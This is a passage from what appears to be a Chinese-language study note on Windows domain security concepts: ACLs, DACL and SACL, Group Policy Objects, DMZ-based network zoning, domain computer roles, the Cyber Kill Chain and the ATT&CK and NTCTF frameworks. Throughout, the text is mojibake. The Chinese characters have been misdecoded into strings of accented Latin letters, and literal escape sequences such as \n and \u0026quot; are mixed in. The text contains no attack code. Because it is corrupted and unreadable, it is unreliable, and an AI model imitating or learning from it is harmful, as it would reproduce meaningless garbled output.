‡è¯†å¹¶ç¡®å®šå…³è”çš„ç”¨æˆ·\nè®¿é—®ä»¤ç‰ŒåŒ…å«çš„ä¿¡æ¯å¦‚ä¸‹ï¼š\nå®‰å…¨æè¿°ç¬¦ ä¸€ç§ä¸æ¯ä¸ªå®‰å…¨å¯¹è±¡ç›¸å…³è”çš„æ•°æ®ç»“æ„ï¼ŒåŒ…å«ä¸å®‰å…¨å¯¹è±¡ç›¸å…³è”çš„å®‰å…¨ä¿¡æ¯æ¯”å¦‚è°æ‹¥æœ‰å¯¹è±¡ã€è°å¯ä»¥è®¿é—®å¯¹è±¡ã€ä»¥ä½•ç§æ–¹å¼è®¿é—®ã€å®¡æŸ¥å“ªäº›ç±»å‹çš„è®¿é—®ä¿¡æ¯ç­‰\nä¸»è¦ç”±SIDå’ŒACLè®¿é—®æ§åˆ¶åˆ—è¡¨ç»„æˆï¼ŒSIDç”¨æ¥æ ‡è¯†ç”¨æˆ·è´¦æˆ·å’Œè¯¥ç”¨æˆ·æ‰€å±çš„ç»„ï¼ŒACLåˆ†ä¸ºDACLå’ŒSACLä¸¤ç§\nè®¿é—®æ§åˆ¶åˆ—è¡¨ å³è®¿é—®æ§åˆ¶é¡¹çš„åˆ—è¡¨ï¼Œåˆ—è¡¨ä¸­æ¯ä¸€ä¸ªè®¿é—®æ§åˆ¶é¡¹åˆ¶å®šäº†ä¸€ç³»åˆ—è®¿é—®æƒé™\nåœ¨è®¿é—®æ§åˆ¶çš„è¿‡ç¨‹ä¸­ï¼ŒACLæœ‰ä¸¤ä¸ªä½œç”¨ï¼š\nè¿›è¡Œè®¿é—®æƒé™æ§åˆ¶ï¼Œåˆ¤æ–­å®‰å…¨ä¸»ä½“èƒ½ä¸èƒ½è®¿é—®è¯¥å®‰å…¨å¯¹è±¡ æ—¥å¿—è®°å½•ï¼Œå¯¹ç”¨æˆ·è®¿é—®æˆåŠŸä¸å¦è¿›è¡Œè®°å½• æ‰€ä»¥å®‰å…¨å¯¹è±¡çš„å®‰å…¨æè¿°å¯ä»¥é€šè¿‡è®¿é—®ä¸¤ç§è®¿é—®æ§åˆ¶åˆ—è¡¨DACLå’ŒSACLè¿›è¡Œ\nDACL è‡ªä¸»è®¿é—®æ§åˆ¶åˆ—è¡¨ï¼Œæ˜¯å®‰å…¨å¯¹è±¡çš„è®¿é—®æ§åˆ¶ç­–ç•¥ï¼Œç”¨äºæŒ‡å®šå…è®¸æˆ–æ‹’ç»ç‰¹å®šå®‰å…¨ä¸»ä½“å¯¹è¯¥å®‰å…¨å¯¹è±¡çš„è®¿é—®ã€‚DACLç”±ä¸€æ¡æ¡çš„è®¿é—®æ§åˆ¶é¡¹ï¼ˆACEï¼‰æ¡ç›®æ„æˆï¼Œæ¯æ¡ACEé€šè¿‡åŒ…å«SIDå®šä¹‰äº†å“ªäº›ç”¨æˆ·æˆ–ç»„å¯¹è¯¥å¯¹è±¡æ‹¥æœ‰æ€æ ·çš„è®¿é—®æƒé™\nSACL ç³»ç»Ÿè®¿é—®æ§åˆ¶åˆ—è¡¨ï¼Œæ˜¯å®‰å…¨ä¸»ä½“å¯¹å®‰å…¨å¯¹è±¡è®¿é—®è¡Œä¸ºçš„å®¡è®¡ç­–ç•¥ï¼Œä¹Ÿç”±ä¸€æ¡æ¡çš„è®¿é—®æ§åˆ¶é¡¹ï¼ˆACEï¼‰æ¡ç›®æ„æˆï¼Œæ¯æ¡ACEå®šä¹‰äº†å¯¹å“ªäº›å®‰å…¨ä¸»ä½“çš„å“ªäº›è®¿é—®è¡Œä¸ºè¿›è¡Œè®°å½•ï¼Œå®‰å…¨ä¸»ä½“çš„è®¿é—®è¡Œä¸ºæ»¡è¶³è¿™æ¡ACEæ—¶å°±ä¼šè¢«è®°å½•\nç»„ç­–ç•¥ group policyï¼Œæ˜¯windowsç¯å¢ƒä¸‹ç®¡ç†è´¦æˆ·çš„ä¸€ç§æ‰‹æ®µï¼Œå¯ä»¥æ§åˆ¶ç”¨æˆ·è´¦æˆ·å’Œè®¡ç®—æœºè´¦æˆ·çš„å·¥ä½œç¯å¢ƒã€‚ç»„ç­–ç•¥å¯ä»¥é›†ä¸­åŒ–ç®¡ç†å’Œé…ç½®æ“ä½œç³»ç»Ÿã€åº”ç”¨ç¨‹åºã€æ´»åŠ¨ç›®å½•ä¸­ç”¨æˆ·è®¾ç½®ï¼ŒåŠŸèƒ½å¾ˆå¤šï¼š æœ¬åœ°ç»„ç­–ç•¥é€‚ç”¨äºç®¡ç†ç‹¬ç«‹ä¸”éåŸŸç¯å¢ƒçš„è®¡ç®—æœºã€‚åŸŸç¯å¢ƒçš„ç»„ç­–ç•¥é€‚ç”¨äºç®¡ç†åŸŸç¯å¢ƒçš„æ‰€æœ‰å¯¹è±¡ï¼ŒåŒ…æ‹¬ç”¨æˆ·å’Œè®¡ç®—æœºï¼Œæ¥ä¸‹æ¥é‡ç‚¹è®°å½•åŸŸç¯å¢ƒçš„ç»„ç­–ç•¥\nç»„ç­–ç•¥å¯¹è±¡ Group Policy Objectï¼ŒGPOï¼Œå³ç»„ç­–ç•¥è®¾ç½®çš„é›†åˆï¼Œå…¶ä¸­åŒ…å«åº”ç”¨äºç‰¹å®šç”¨æˆ·æˆ–è®¡ç®—æœºçš„ç­–ç•¥ä¿¡æ¯å’Œå…·ä½“é…ç½®ï¼Œè®¾ç½®ç»„ç­–ç•¥æ—¶ï¼Œåªéœ€å°†ç»„ç­–ç•¥å¯¹è±¡é“¾æ¥åˆ°æŒ‡å®šçš„ç«™ç‚¹ã€åŸŸå’Œç»„ç»‡å•ä½ï¼Œå…¶ä¸­çš„ç­–ç•¥å€¼ä¾¿ä¼šåº”ç”¨åˆ°è¯¥ç«™ç‚¹ã€åŸŸå’Œç»„ç»‡å•ä½çš„æ‰€æœ‰ç”¨æˆ·å’Œè®¡ç®—æœº\nGPOç”±ç»„ç­–ç•¥å®¹å™¨ï¼ˆGroup Policy Containerï¼ŒGPCï¼‰å’Œç»„ç­–ç•¥æ¨¡æ¿ï¼ˆGroup Policy Templateï¼ŒGPTï¼‰ç»„æˆï¼Œåˆ†åˆ«å­˜å‚¨åœ¨DCçš„ä¸åŒä½ç½®ä¸Šï¼ŒGPCå­˜å‚¨åœ¨æ´»åŠ¨ç›®å½•çš„åŸŸåˆ†åŒºï¼ŒGPTå­˜å‚¨åœ¨DCçš„æ–‡ä»¶å¤¹ä¸­ï¼š%SYSTEMROOT%\\SYSVOL\\åŸŸå\\Policies\nwin+Rï¼šgpmc.mscå³å¯æ‰“å¼€ç»„ç­–ç•¥ç®¡ç†å™¨ï¼š è¿™é‡Œå¯ä»¥çœ‹åˆ°ä¸¤ä¸ªé»˜è®¤ç»„ç­–ç•¥å¯¹è±¡default domain controllerså’Œdefault domain policyï¼Œå®ƒä»¬åœ¨DCè¢«å»ºç«‹æ—¶è‡ªåŠ¨åˆ›å»º\nç»„ç­–ç•¥åˆ›å»º æˆ‘ä»¬åœ¨å‰é¢åˆ›å»ºäº†ç»„ç»‡å•ä½ï¼šäººäº‹éƒ¨é—¨ã€‚ç°åœ¨åˆ›å»ºä¸€ä¸ªæ–°çš„ç»„ç­–ç•¥ï¼Œå¹¶å°†å…¶åº”ç”¨åˆ°â€œäººäº‹éƒ¨é—¨â€ï¼Œã€\nåœ¨ç»„ç­–ç•¥ç®¡ç†å™¨ä¸­ï¼Œå³é”®ç»„ç­–ç•¥å¯¹è±¡ï¼Œç‚¹å‡»æ–°å»ºï¼Œåˆ›å»ºä¸€ä¸ªåä¸ºtestçš„GPO\næ¥ä¸‹æ¥é“¾æ¥GPOï¼Œå³é”®äººäº‹éƒ¨é—¨é€‰æ‹©â€é“¾æ¥ç°æœ‰GPOâ€œï¼Œåœ¨å‡ºç°çš„æ¡†ä¸­é€‰ä¸­æ–°å»ºçš„ç»„ç­–ç•¥testï¼š\nç¡®å®šå³å¯é“¾æ¥æˆåŠŸ\nä¼ä¸šå¸¸è§„å®‰å…¨åŸŸåˆ’åˆ† å³åŸºäºå®‰å…¨è€ƒé‡çš„åŸŸèŒƒå›´åˆ’åˆ†\nåˆ’åˆ†å®‰å…¨åŸŸçš„ç›®çš„æ˜¯å°†ä¸€ç»„å®‰å…¨ç­‰çº§ç›¸åŒçš„è®¡ç®—æœºåˆ’å…¥åŒä¸€ä¸ªç½‘æ®µï¼Œè¿™ä¸ªç½‘æ®µå†…çš„è®¡ç®—æœºæ‹¥æœ‰ç›¸åŒçš„ç½‘ç»œè¾¹ç•Œï¼Œå¹¶åœ¨ç½‘ç»œè¾¹ç•Œä¸Šé€šè¿‡éƒ¨ç½²é˜²ç«å¢™æ¥å®ç°å¯¹å…¶ä»–å®‰å…¨åŸŸçš„ç½‘ç»œè®¿é—®æ§åˆ¶ç­–ç•¥ ï¼Œä»è€Œå¯¹å…è®¸å“ªäº›IPåœ°å€è®¿é—®æ­¤åŸŸã€å…è®¸æ­¤åŸŸè®¿é—®å“ªäº›IPåœ°å€å’Œç½‘æ®µè¿›è¡Œè®¾ç½®ã€‚è¿™äº›æªæ–½ï¼Œå°†ä½¿å¾—ç½‘ç»œé£é™©æœ€å°åŒ–ï¼Œå½“æ”»å‡»å‘ç”Ÿæ—¶,å¯ä»¥å°½å¯èƒ½åœ°å°†å¨èƒéš”ç¦»ï¼Œä»è€Œé™ä½å¯¹åŸŸå†…è®¡ç®—æœºçš„å½±å“ï¼š\nä¸€ä¸ªç”±è·¯ç”±å™¨è¿æ¥çš„å†…ç½‘ä¸­ï¼Œå¯ä»¥å°†ç½‘ç»œæŒ‰ç…§å®‰å…¨çº§åˆ«ä»é«˜åˆ°ä½åˆ’åˆ†ä¸ºä¸‰ä¸ªåŒºåŸŸï¼š\nå†…ç½‘ï¼ˆå®‰å…¨çº§åˆ«æœ€é«˜ï¼‰ï¼šåˆ†ä¸ºæ ¸å¿ƒåŒºï¼ˆå­˜å‚¨ä¼ä¸šæœ€é‡è¦çš„æ•°æ®ï¼Œåªæœ‰å¾ˆå°‘çš„ä¸»æœºèƒ½å¤Ÿè®¿é—®ï¼‰å’Œç”Ÿäº§/åŠå…¬åŒºï¼ˆå‘˜å·¥æ—¥å¸¸å·¥ä½œåŒºï¼Œä¸€èˆ¬èƒ½å¤Ÿè®¿é—®DMZï¼Œéƒ¨åˆ†ä¸»æœºå¯ä»¥è®¿é—®æ ¸å¿ƒåŒºï¼‰ DMZï¼ˆDemilitarized Zoneï¼Œè¾¹ç•Œç½‘ç»œï¼Œéš”ç¦»åŒºï¼Œå®‰å…¨çº§åˆ«ä¸­ç­‰ï¼‰ï¼šä½œä¸ºå†…ç½‘ä¸­å®‰å…¨ç³»ç»Ÿå’Œéå®‰å…¨ç³»ç»Ÿä¹‹é—´çš„ç¼“å†²åŒºï¼Œç”¨äºå¯¹å¤–æä¾›æœåŠ¡ï¼Œä¸€èˆ¬å¯ä»¥æ”¾ç½®ä¸€äº›å¿…é¡»å…¬å¼€çš„æœåŠ¡å™¨è®¾æ–½ å¤–ç½‘ï¼ˆInternetï¼Œå®‰å…¨çº§åˆ«æœ€ä½ï¼‰ æ‹¥æœ‰DMZçš„ç½‘ç»œéœ€è¦åˆ¶å®šä¸€äº›è®¿é—®æ§åˆ¶ç­–ç•¥ï¼š\nå†…ç½‘å¯ä»¥è®¿é—®å¤–ç½‘:å†…ç½‘ç”¨æˆ·éœ€è¦è‡ªç”±åœ°è®¿é—®å¤–ç½‘ã€‚åœ¨è¿™ä¸€ç­–ç•¥ä¸­,é˜²ç«å¢™éœ€è¦æ‰§è¡ŒNAT å†…ç½‘å¯ä»¥è®¿é—®DMZ:æ­¤ç­–ç•¥ä½¿å†…ç½‘ç”¨æˆ·å¯ä»¥ä½¿ç”¨æˆ–è€…ç®¡ç†DMZä¸­çš„æœåŠ¡å™¨ å¤–ç½‘ä¸èƒ½è®¿é—®å†…ç½‘:è¿™æ˜¯é˜²ç«å¢™çš„åŸºæœ¬ç­–ç•¥ã€‚å†…ç½‘ä¸­å­˜å‚¨çš„æ˜¯å…¬å¸å†…éƒ¨æ•°æ®,æ˜¾ç„¶,è¿™äº›æ•°æ®ä¸€èˆ¬æ˜¯ä¸å…è®¸å¤–ç½‘ç”¨æˆ·è®¿é—®çš„(å¦‚æœè¦è®¿é—®,å°±è¦é€šè¿‡VPNçš„æ–¹å¼æ¥è¿›è¡Œ) å¤–ç½‘å¯ä»¥è®¿é—®DMZ:å› ä¸ºDMZä¸­çš„æœåŠ¡å™¨éœ€è¦ä¸ºå¤–ç•Œæä¾›æœåŠ¡,æ‰€ä»¥å¤–ç½‘å¿…é¡»å¯ä»¥è®¿é—®DMZã€‚åŒæ—¶,éœ€è¦ç”±é˜²ç«å¢™æ¥å®Œæˆä»å¯¹å¤–åœ°å€åˆ°æœåŠ¡å™¨å®é™…åœ°å€çš„è½¬æ¢ DMZä¸èƒ½è®¿é—®å†…ç½‘:å¦‚æœä¸æ‰§è¡Œæ­¤ç­–ç•¥,å½“æ”»å‡»è€…æ”»é™·DMZæ—¶,å†…ç½‘å°†æ— æ³•å—åˆ°ä¿æŠ¤ DMZä¸èƒ½è®¿é—®å¤–ç½‘:æ­¤ç­–ç•¥ä¹Ÿæœ‰ä¾‹å¤–ã€‚ä¾‹å¦‚,åœ¨DMZä¸­æ”¾ç½®äº†é‚®ä»¶æœåŠ¡å™¨,å°±è¦å…è®¸è®¿é—®å¤–ç½‘,å¦åˆ™é‚®ä»¶æœåŠ¡å™¨æ— æ³•æ­£å¸¸å·¥ä½œ é€šå¸¸æƒ…å†µä¸‹ï¼Œå„ç±»ç›®æ ‡ç½‘ç»œçš„å®‰å…¨çº§åˆ«æ˜¯\u0026quot;å¤–éƒ¨ç½‘ç»œ \u0026lt; DMZåŒº \u0026lt; æ ¸å¿ƒåŒºã€åŠå…¬/ç”Ÿäº§åŒº\u0026quot;ï¼Œè€Œåœ¨å†…ç½‘æ¸—é€è¿‡ç¨‹ä¸­ï¼Œç›®æ ‡å³ä¸ºå°½å¯èƒ½åœ°è·å–æœ€é«˜çº§åˆ«ç½‘ç»œä¸­åŸŸç¯å¢ƒçš„æ§åˆ¶æƒï¼Œä»è€Œå®ç°å¯¹ä¸šåŠ¡çš„å®Œå…¨æ§åˆ¶\nåŠå…¬åŒºï¼šå…¬å¸å‘˜å·¥æ—¥å¸¸çš„å·¥ä½œåŒºï¼Œä¸€èˆ¬ä¼šå®‰è£…é˜²ç—…æ¯’è½¯ä»¶ã€ä¸»æœºå…¥ä¾µæ£€æµ‹äº§å“ç­‰ã€‚åŠå…¬åŒºä¸€èˆ¬èƒ½å¤Ÿè®¿é—®DMZã€‚å¦‚æœè¿ç»´äººå‘˜ä¹Ÿåœ¨åŠå…¬åŒº,é‚£ä¹ˆéƒ¨åˆ†ä¸»æœºä¹Ÿèƒ½è®¿é—®æ ¸å¿ƒæ•°æ®åŒº(å¾ˆå¤šä¼ä¸šè¿˜ä¼šä½¿ç”¨å ¡å’æœºæ¥ç»Ÿä¸€ç®¡ç†ç”¨æˆ·çš„ç™»å½•è¡Œä¸º)æ”»å‡»è€…å¦‚æœæƒ³è¿›å…¥å†…ç½‘ï¼Œä¸€èˆ¬ä¼šä½¿ç”¨é±¼å‰æ”»å‡»ã€æ°´å‘æ”»å‡»ï¼Œå½“ç„¶è¿˜æœ‰ç¤¾ä¼šå·¥ç¨‹å­¦æ‰‹æ®µã€‚åŠå…¬åŒºäººå‘˜å¤šè€Œæ‚ï¼Œå˜åŠ¨ä¹Ÿå¾ˆé¢‘ç¹ï¼Œåœ¨å®‰å…¨ç®¡ç†ä¸Šå¯èƒ½å­˜åœ¨è¯¸å¤šæ¼æ´,æ˜¯æ”»å‡»è€…è¿›äººå†…ç½‘çš„é‡è¦é€”å¾„ä¹‹ æ ¸å¿ƒåŒºï¼šå­˜å‚¨ä¼ä¸šæœ€é‡è¦çš„æ•°æ®ã€æ–‡æ¡£ç­‰ä¿¡æ¯èµ„äº§,é€šè¿‡æ—¥å¿—è®°å½•ã€å®‰å…¨å®¡è®¡ç­‰å®‰å…¨æªæ–½è¿›è¡Œä¸¥å¯†çš„ä¿æŠ¤ï¼Œå¾€å¾€åªæœ‰å¾ˆå°‘çš„ä¸»æœºèƒ½å¤Ÿè®¿é—®ã€‚ä»å¤–éƒ¨æ˜¯ç»éš¾ç›´æ¥è®¿é—®æ ¸å¿ƒåŒºçš„ã€‚ä¸€èˆ¬æ¥è¯´,èƒ½å¤Ÿç›´æ¥è®¿é—®æ ¸å¿ƒåŒºçš„åªæœ‰è¿ç»´äººå‘˜æˆ–è€…ITéƒ¨é—¨çš„ä¸»ç®¡,æ‰€ä»¥ï¼Œæ”»å‡»è€…ä¼šé‡ç‚¹å…³æ³¨è¿™äº›ç”¨æˆ·çš„ä¿¡æ¯(æ”»å‡»è€…åœ¨å†…ç½‘ä¸­è¿›è¡Œæ¨ªå‘ç§»åŠ¨æ”»å‡»æ—¶ï¼Œä¼šä¼˜å…ˆæŸ¥æ‰¾è¿™äº›ä¸»æœº) ä¼ä¸šåŸŸä¸­è®¡ç®—æœºåˆ†ç±» åŸŸä¸­è®¡ç®—æœºçš„åˆ†ç±»åœ¨åŸŸç»“æ„çš„ç½‘ç»œä¸­ï¼Œè®¡ç®—æœºçš„èº«ä»½æ˜¯ä¸å¹³ç­‰çš„ï¼Œæœ‰åŸŸæ§åˆ¶å™¨ã€æˆå‘˜æœåŠ¡å™¨ã€å®¢æˆ·æœºã€ç‹¬ç«‹æœåŠ¡å™¨å››ç§ç±»å‹\nåŸŸæ§åˆ¶å™¨ åœ¨å‰é¢çš„åŸºæœ¬æ¦‚å¿µä¸­ä¹Ÿä»‹ç»äº†ï¼ŒåŸŸæ§åˆ¶å™¨ç”¨äºç®¡ç†æ‰€æœ‰çš„ç½‘ç»œè®¿é—®ï¼ŒåŒ…æ‹¬ç™»å½•æœåŠ¡å™¨ã€è®¿é—®å…±äº«ç›®å½•å’Œèµ„æºã€‚åŸŸæ§åˆ¶å™¨ä¸­å­˜å‚¨äº†åŸŸå†…æ‰€æœ‰çš„è´¦æˆ·å’Œç­–ç•¥ä¿¡æ¯ï¼ŒåŒ…æ‹¬å®‰å…¨ç­–ç•¥ã€ç”¨æˆ·èº«ä»½éªŒè¯ä¿¡æ¯å’Œè´¦æˆ·ä¿¡æ¯\nåœ¨ç½‘ç»œä¸­,å¯ä»¥æœ‰å¤šå°è®¡ç®—æœºè¢«é…ç½®ä¸ºåŸŸæ§åˆ¶å™¨ï¼Œä»¥æ§åˆ¶ç”¨æˆ·çš„ç™»å½•ã€è®¿é—®ç­‰æ“ä½œã€‚å¤šä¸ªåŸŸæ§åˆ¶å™¨å¯ä»¥ä¸€èµ·å·¥ä½œ,è‡ªåŠ¨å¤‡ä»½ç”¨æˆ·è´¦æˆ·å’Œæ´»åŠ¨ç›®å½•æ•°æ®ã€‚è¿™æ ·ï¼Œå³ä½¿éƒ¨åˆ†åŸŸæ§åˆ¶å™¨ç˜«ç—ªï¼Œç½‘ç»œè®¿é—®ä¹Ÿä¸ä¼šå—åˆ°å½±å“,æé«˜äº†ç½‘ç»œçš„å®‰å…¨æ€§å’Œç¨³å®šæ€§\næˆå‘˜æœåŠ¡å™¨ ä¸€èˆ¬æ˜¯win serverç³»ç»Ÿï¼Œæˆå‘˜æœåŠ¡å™¨æ˜¯æŒ‡å®‰è£…äº†æœåŠ¡å™¨æ“ä½œç³»ç»Ÿå¹¶åŠ å…¥äº†åŸŸï¼Œä½†æ²¡æœ‰å®‰è£…æ´»åŠ¨ç›®å½•çš„è®¡ç®—æœº,å…¶ä¸»è¦ä»»åŠ¡æ˜¯æä¾›ç½‘ç»œèµ„æºã€‚æˆå‘˜æœåŠ¡å™¨çš„ç±»å‹é€šå¸¸æœ‰æ–‡ä»¶æœåŠ¡å™¨ã€åº”ç”¨æœåŠ¡å™¨ã€æ•°æ®åº“æœåŠ¡å™¨ã€webæœåŠ¡å™¨ã€é‚®ä»¶æœåŠ¡å™¨ã€é˜²ç«å¢™ã€è¿œç¨‹è®¿é—®æœåŠ¡å™¨ã€æ‰“å°æœåŠ¡å™¨ç­‰\nå®¢æˆ·æœº ä¸€èˆ¬æ˜¯æ­£å¸¸winç³»ç»Ÿï¼ŒåŸŸä¸­çš„è®¡ç®—æœºå¯ä»¥æ˜¯å®‰è£…äº†å…¶ä»–æ“ä½œç³»ç»Ÿçš„è®¡ç®—æœº,ç”¨æˆ·åˆ©ç”¨è¿™äº›è®¡ç®—æœºå’ŒåŸŸä¸­çš„è´¦æˆ·å°±å¯ä»¥ç™»å½•åŸŸã€‚è¿™äº›è®¡ç®—æœºè¢«ç§°ä¸ºåŸŸä¸­çš„å®¢æˆ·æœºã€‚åŸŸç”¨æˆ·è´¦å·é€šè¿‡åŸŸçš„å®‰å…¨éªŒè¯å,å³å¯è®¿é—´ç½‘ç»œä¸­çš„å„ç§èµ„æºã€‚\nç‹¬ç«‹æœåŠ¡å™¨ ç‹¬ç«‹æœåŠ¡å™¨å’ŒåŸŸæ²¡æœ‰å…³ç³»ã€‚å¦‚æœæœåŠ¡å™¨æ—¢ä¸åŠ å…¥åŸŸï¼Œä¹Ÿä¸å®‰è£…æ´»åŠ¨ç›®å½•,å°±ç§°å…¶ä¸ºç‹¬ç«‹æœåŠ¡å™¨ã€‚ç‹¬ç«‹æœåŠ¡å™¨å¯ä»¥åˆ›å»ºå·¥ä½œç»„ã€ä¸ç½‘ç»œä¸­çš„å…¶ä»–è®¡ç®—æœºå…±äº«èµ„æºï¼Œä½†ä¸èƒ½ä½¿ç”¨æ´»åŠ¨ç›®å½•æä¾›çš„ä»»ä½•æœåŠ¡\nåŸŸæ§åˆ¶å™¨ç”¨äºå­˜æ”¾æ´»åŠ¨ç›®å½•æ•°æ®åº“,æ˜¯åŸŸä¸­å¿…é¡»è¦æœ‰çš„ï¼Œè€Œå…¶ä»–ä¸‰ç§è®¡ç®—æœºåˆ™ä¸æ˜¯å¿…é¡»è¦æœ‰çš„ï¼Œä¹Ÿå°±æ˜¯è¯´,æœ€ç®€å•çš„åŸŸå¯ä»¥åªåŒ…å«ä¸€å°è®¡ç®—æœºï¼Œå³ä¸€å°åŸŸæ§ã€‚å½“ç„¶ï¼ŒåŸŸä¸­æœåŠ¡å™¨è§’è‰²æ˜¯å¯å˜çš„ï¼Œæ¯”å¦‚ç‹¬ç«‹æœåŠ¡å™¨æ—¢å¯ä»¥æˆä¸ºåŸŸæ§åˆ¶å™¨ï¼Œä¹Ÿå¯ä»¥åŠ å…¥æŸåŸŸæˆä¸ºæˆå‘˜æœåŠ¡å™¨\nå¸¸è§„æ”»å‡»æµç¨‹çš„è®¤çŸ¥ æ¥ä¸‹æ¥çš„å†…å®¹ç”¨æ¥ç®€å•äº†è§£ä¸€å¥—å®Œæ•´çš„æ”»å‡»æµç¨‹åŒ…å«å“ªäº›æ­¥éª¤\nç½‘ç»œæ€ä¼¤é“¾ ç½‘ç»œæ€ä¼¤é“¾ï¼ˆCyber-Kill-Chainï¼‰ç”±ä¸ƒä¸ªæ­¥éª¤ç»„æˆï¼š\nä¾¦å¯Ÿï¼šå¯ä»¥ç†è§£ä¸ºä¿¡æ¯æ”¶é›†è·å–æ”»å‡»å…¥å£ç‚¹ æ­¦å™¨åŒ–ï¼šæ ¹æ®æ¼æ´æˆ–åé—¨åˆ¶ä½œæ”»å‡»æ­¦å™¨ï¼Œå®ç°å¿«é€Ÿçªç ´ æŠ•é€’ï¼šå°†æ­¦å™¨å‘ç›®æ ‡æŠ•é€’ï¼Œä¾‹å¦‚é’“é±¼é‚®ä»¶ã€webè®¿é—®ã€USBå¤–è®¾ç­‰ æ¼æ´åˆ©ç”¨ï¼šå½“æ­¦å™¨ï¼ˆæ¶æ„è½¯ä»¶ï¼‰è§¦åŠåˆ°ç›®æ ‡ç³»ç»Ÿæˆ–ç»ˆç«¯æ—¶ï¼Œä¼šé€šè¿‡æ¼æ´ç­‰æ–¹å¼ï¼Œæ§åˆ¶å—å®³è€…çš„ç»ˆç«¯æˆ–ä¸šåŠ¡ç³»ç»ŸæœåŠ¡å™¨ å®‰è£…ï¼šæ¶æ„è½¯ä»¶å®‰è£…ä¸€ä¸ªæ–°çš„åé—¨æˆ–æ–°çš„æœ¨é©¬ç¨‹åºï¼Œä»¥æå‡å…¥ä¾µè€…çš„è®¿é—®æƒé™ï¼Œèƒ½æ¥è§¦åˆ°æ›´å¤šç³»ç»Ÿ å‘½ä»¤ä¸æ§åˆ¶ï¼šé€šè¿‡å‰è¿°å„ç±»æ”»å‡»æ­¦å™¨ï¼Œæ”»å‡»è€…å¯ä»¥è¿›è¡Œå‘½ä»¤æ§åˆ¶æ“ä½œï¼Œè·å¾—ç‰¹æƒå¸æˆ·çš„è®¿é—®æƒé™å¹¶å°è¯•æš´åŠ›æ”»å‡»ã€æœç´¢å‡­æ®å¹¶æ›´æ”¹æƒé™ä»¥æ¥ç®¡æ§åˆ¶æƒ ç›®æ ‡è¡ŒåŠ¨ï¼šå½“æ”»å‡»è€…æ¥è§¦åˆ°æ—¢å®šæ”»å‡»ç›®æ ‡æ—¶ï¼Œå¯ä»¥å¯¹å…¶è¿›è¡Œå„ç§æ—¢å®šè¡ŒåŠ¨ï¼ˆå¦‚ç›—çªƒæœºå¯†æ•°æ®ã€ç ´å/åŠ å¯†æ•°æ®è¿›è¡Œå‹’ç´¢ç­‰ï¼‰ åŸºäºæ­¤æ¨¡å‹ï¼Œå¯ä»¥å®ç°å¯¹ç½‘ç»œæ”»å‡»åˆ†é˜¶æ®µé˜²å¾¡ï¼Œé™ä½æ”»å‡»ä¼¤å®³\nä½†æ­¤æ¨¡å‹å­˜åœ¨ä¸è¶³ï¼š\næŠ½è±¡ç¨‹åº¦è¾ƒé«˜ï¼Œä¸åŒçš„æ”»æ–¹ã€å®ˆæ–¹é’ˆå¯¹ åŒä¸€ä¸ªæ”»å‡»äº‹ä»¶ ï¼Œä¹Ÿä¼šç»™å‡ºä¸åŒçš„æè¿°ï¼Œç¼ºä¹ç»Ÿä¸€çš„æè¿°æœºåˆ¶å’ŒåŸè¯­æ”¯æ’‘\néšç€ç½‘ç»œä¸–ç•Œçš„å¤æ‚åŒ–ï¼Œæ”»é˜²ä¸å¯¹ç§°ç¨‹åº¦æŒç»­æ·±åŒ–ã€‚é’ˆå¯¹åŒä¸€ä¸ªé˜¶æ®µï¼Œæ”»å‡»æ–¹æœ‰æ— æ•°ç§æŠ€æœ¯ã€æ–¹æ³•å¯ä»¥ä½¿ç”¨ï¼Œè€Œé˜²å®ˆæ–¹ å´æ— æ³•æ¸…æ™°æè¿°å’ŒçŸ¥æ™“è‡ªèº«çš„å®‰å…¨é˜²æŠ¤èƒ½åŠ›çš„å…¨æ™¯å®å†µ ï¼Œéš¾ä»¥æŒç»­æå‡æ”»é˜²å¯¹æŠ—èƒ½åŠ›\nATT\u0026amp;CK ATT\u0026amp;CKï¼ˆCommon Knowledge base of Adversary Ta ctics and Techniquesï¼‰æ˜¯ä¸€ä¸ªæˆ˜æœ¯çŸ¥è¯†åº“ï¼Œæä¾›äº†ä¸€ä¸ªå¤æ‚æ¡†æ¶ï¼Œå¾ˆå¥½çš„å¼¥è¡¥äº†CKCçš„é«˜å±‚æŠ½è±¡ã€æœªçŸ¥å¨èƒï¼ˆIOCï¼‰ä»¥åŠç‰¹å¾ä¹‹é—´çš„è½å·®ï¼Œå¯¹æ”»å‡»è¡Œä¸ºè¿›è¡Œäº†åˆ†ç±»å’Œç‰¹å¾åŒ–ï¼Œè®©æ”»å‡»é˜²å¾¡ä¸å±€é™äºçç¢çš„è§‚å¯Ÿç‚¹\nè¯¥æˆ˜æœ¯åº“è¿›è¡Œäº†ä¸€å®šç¨‹åº¦çš„åˆ†ç±»å’ŒæŠ½è±¡ï¼Œå…·å¤‡äº†ä¸€å®šçš„é˜²å¾¡IOCçš„èƒ½åŠ›ï¼Œä»æ¡†æ¶ä¸Šå¯ä»¥çœ‹å‡ºå…¶éå¸¸è¯¦ç»†ï¼š\nNTCTF NTCTFï¼ˆTechnical Cyber Threat Frameworkï¼‰æ˜¯ä¸€ä¸ªåŸºäºATT\u0026amp;CKé‡æ–°æ„é€ çš„ç½‘ç»œå¨èƒå…¥ä¾µè¿‡ç¨‹æ¨¡å‹\nè¯¥æ¨¡å‹é€šè¿‡4ä¸ªå±‚æ¬¡æ„å»ºï¼š\né˜¶æ®µ ç›®æ ‡ è¡Œä¸º å…³é”®çŸ­è¯­ å¹¶æŠŠå…¥ä¾µè¿‡ç¨‹åˆ†ä¸ºå…­ä¸ªé˜¶æ®µï¼š\nè¡ŒåŠ¨ç®¡ç† å‡†å¤‡æ´»åŠ¨ æ¥è§¦ç›®æ ‡å’Œè¿›æ”»çªé˜² æŒä¹…åŒ–é©»ç•™æ½œä¼ æ•ˆæœ æŒç»­æ”¯æ’‘ä½œä¸š æ¯ä¸ªé˜¶æ®µéƒ½ç”±ç›®æ ‡ã€è¡Œä¸ºå’Œå…³é”®çŸ­è¯­æ¥æä¾›æ”¯æ’‘ï¼Œè€Œå…¶ä¸­è¡Œä¸ºçš„æ ¸å¿ƒæ”¯æ’‘ç‚¹å°±æ¥è‡ªATT\u0026amp;CKæˆ˜æœ¯çŸ¥è¯†åº“\n",
